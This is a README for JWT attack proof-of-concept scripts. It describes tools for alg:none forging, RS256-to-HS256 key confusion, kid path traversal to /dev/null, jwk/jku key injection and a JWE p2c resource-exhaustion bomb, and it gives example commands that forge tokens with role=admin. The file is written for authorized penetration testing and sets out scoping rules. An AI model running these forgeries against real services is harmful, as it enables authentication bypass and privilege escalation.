# JWT PoC Scripts

Runnable forging tools for the signature/key attacks in `JWT_TESTING_GUIDE.md` (Part II) and the impact demos in Part IV. They produce **forged tokens** so you can test whether the server accepts attacker-controlled content — which is the whole game (guide §3, §28).

## ⚠️ Authorized use only — read before using
- Use **only** on targets you are **explicitly authorized** to test (in-scope bug-bounty asset or a signed engagement).
- **Forge only into your own test accounts** (your own `sub`, a test admin you control). For "any user" demos use **two of your own accounts**. Never impersonate or access a real user, reset a real user's password, or read another real tenant's data.
- **Crack secrets offline** on a single captured token — do not brute-force the production server.
- Keep PoCs **read-only / reversible**; clean up forged-admin sessions and test changes afterward (guide §32).

## Requirements
```bash
pip install pyjwt cryptography      # rs256_to_hs256.py / jwk_inject.py / jwks_server.py use 'cryptography'
# forge_token.py, alg_none.py, kid_injection.py use only the Python standard library.
```

> **Windows/PowerShell note:** PowerShell silently drops an empty-string argument when calling
> `python.exe`, so `--secret ""` is lost. For an empty key (e.g. the `kid` → `/dev/null` trick),
> just **omit** `--secret` (it defaults to empty), or run the scripts from bash/WSL where `--secret ""`
> works as written.

## Files
| File | Attack | Guide § |
|------|--------|---------|
| `jwt_common.py` | shared base64url / decode / sign helpers (imported by the others) | — |
| `forge_token.py` | generic: tamper claims + re-sign with `none` or `HS256/384/512` | §6, §7, §15 |
| `alg_none.py` | forge an `alg:none` token (none/None/NONE variants) | §6 |
| `rs256_to_hs256.py` | RS256→HS256 confusion: HMAC-sign with the public key (tries PEM/DER/newline variants) | §8/§9 |
| `kid_injection.py` | set a malicious `kid` (e.g. `../../../../dev/null`) and sign HS with a chosen/empty key | §10 |
| `jwk_inject.py` | embed a self-generated public key via `jwk` (or `x5c`) and sign with its private key | §12/§13 |
| `jwks_server.py` | generate a keypair, serve `/jwks.json` with your public key (for `jku`/`x5u`), print the forge command | §11 |
| `jwe_dos_token.py` | build a JWE PBES2 **`p2c` bomb** header to test resource-exhaustion DoS — **only where DoS is in scope**; show one-request cost, never flood | §20.1 |

## Typical flow
```bash
TOKEN='eyJ...'

# Baseline / none:
python3 alg_none.py "$TOKEN" --claim role=admin

# Weak HS256 (after cracking the secret offline with hashcat -m 16500):
python3 forge_token.py "$TOKEN" --alg HS256 --secret 'CRACKED' --claim role=admin --claim sub=1337

# RS256 -> HS256 confusion (need the public key PEM from the JWKS):
python3 rs256_to_hs256.py "$TOKEN" --pubkey public.pem --claim role=admin

# kid traversal to empty key:
python3 kid_injection.py "$TOKEN" --kid "../../../../dev/null" --secret "" --claim role=admin

# Embedded jwk (no hosting needed):
python3 jwk_inject.py "$TOKEN" --claim role=admin

# jku (host your JWKS, then forge with jwt_tool using the printed private key):
python3 jwks_server.py --port 8000
```
Send each forged token to an endpoint that uses it for authz and check for **acceptance + behavior change** (guide §5.2). Then escalate and report with `../JWT_REPORT_TEMPLATE.md`.
